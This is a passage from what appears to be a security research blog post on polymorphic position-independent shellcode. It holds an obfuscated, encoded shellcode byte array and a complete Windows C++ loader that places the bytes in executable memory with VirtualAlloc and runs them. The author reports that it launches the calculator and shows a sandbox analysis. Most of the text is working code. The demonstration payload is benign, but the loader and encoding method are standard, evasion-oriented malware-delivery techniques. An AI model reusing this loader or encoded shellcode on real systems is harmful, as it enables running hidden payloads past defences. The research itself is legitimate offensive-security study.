"\x1a" "\x92" "¶" "S" "5" "Ò" "\x92" "¬" "Û" "\x1e" "Ô" "½" "\x1b" "\x92" "º" "[" "\x1a" "\x92" "\x9f" "S" "Ø" "G" "X" "\x1f" "Ô" "´" "\x1f" "R" "\x91" "\x1e" "Ú" "¾" "\x17" "Ø" "\x01" "G" "\x1e" "b" "¾" "\x1e" "b" "\x88" "\x1a" "Ð" "¿" "S" "\x17" "Ø" "\t" "s" "\x1a" "Ð" "\xad" "S" "\x1e" "R" "\x90" "\x1e" "Ô" "½" "\x1f" "Ú" "\x82" "\x1f" "Ô" "¼" "\x1b" "ë" "û" "Å" "Â" "é" "Ô" "É" "Ï" "<" "\x1b" "\x92" "\x9c" "S" "\x1b" "¤" "\x83" "\x1a" "Ô" "®" "\x1b" "\x92" "³" "[" "\x1e" "Ú" "¾" "\x1b" "\x92" "»" "[" "\x1e" "Ô" "µ" "\x03" "\x1e" "Ö" "¥" "\x1b" "Ú" "³" "\x1a" "Ô" "\xad" "\x1b" "Ð" "\x97" "[" "\x1e" "Ú" "·" "4" "°" "c" "\x1a" "Ô" "\xad" "b" "\x88" "\x1a" "Ô" "¯" "\x12" "Ø" "O" "Ø" "\x1b" "\x92" "´" "S" "\x1f" "R" "\x90" "\x1e" "Ô" "µ" "\x1b" "¬" "\x9a" "\x1a" "Ô" "¯" "\x1f" "Ø" "[" "\x1e" "Ô" "§" "\x1f" "j" "X" "\'" "^" "\x1e" "Ô" "½" "&" "\x82" "\x1a" "\x92" "µ" "S" "\x9f" "\x1a" "Ô" "¯" "¬" "\x92" "\x1e" "Ö" "·" "\x1e" "b" "\x88" "\x1e" "Ô" "§" "\x17" "Ø" "\t" "O" "\x1f" "Ô" "¤" "\x1e" "R" "\x90" "\x1e" "Ô" "¿" "\x16" "Ø" "o" "Ø" "\x1a" "Ô" "\xad" "\x1e" "R" "\x94" "\x1e" "b" "¥" "\x1b" "b" "\x93" "\x1a" "Ð" "\x96" "S" "\x03" "\x1a" "Ô" "®" "\x1b" "ë" "Ï" "Í" "À" "Ï" "\x82" "É" "Ô" "É" "\x1a" "Ð" "¯" "S" "\x1b" "¤" "\x83" "\x1e" "Ô" "½" "\x03" "\x1a" "Ô" "\xad" "\x1b" "Ú" "²" "\x1e" "Ö" "·" "\x1b" "b" "\x81" "\x1e" "Ô" "½" "\x1b" "¬" "\x91" "\x1a" "Ô" "\xad" "\x1b" "Ð" "¿" "c" "\x1a" "Ô" "¯" "\x12" "¬" "\x84" "\x1e" "Ô" "§" "S" "S" "S" "S" "S";

int main() {
    size_t shellcode_size = sizeof(shellcode);
    void* exec_mem = VirtualAlloc(nullptr, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (exec_mem == nullptr) {
        std::cerr << "Memory allocation failed\n";
        return -1;
    }

    memcpy(exec_mem, shellcode, shellcode_size);
    auto shellcode_func = reinterpret_cast<void(*)()>(exec_mem);
    shellcode_func();

    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}
```

Compile and run that, and you should be greeted with the ever familiar windows calculator!

<img width="1479" height="753" alt="image" src="https://github.com/user-attachments/assets/105136ad-d17b-4537-aa8e-b7b040959993" />

Well, that's it for this particular post.  But I anticipate I'll do more development and research work surrounding polymorphic PIC shellcode in the near future.  Stay tuned!

***ANY.RUN Results***
-

<img width="1549" height="623" alt="image" src="https://github.com/user-attachments/assets/475df143-f13f-4819-a611-9c64767a6ee8" />

[Full Sandbox Analysis](https://app.any.run/tasks/c81c07c1-f6b9-4f74-bb89-95bc605b7ecb)

<div style="text-align: right;">
Sponsored by:<br>
<img src="https://github.com/user-attachments/assets/111a0bb6-66e1-43b0-9a0a-5ce093f4b65e" alt="Sponsor logo" style="max-width: 200px;">
</div>
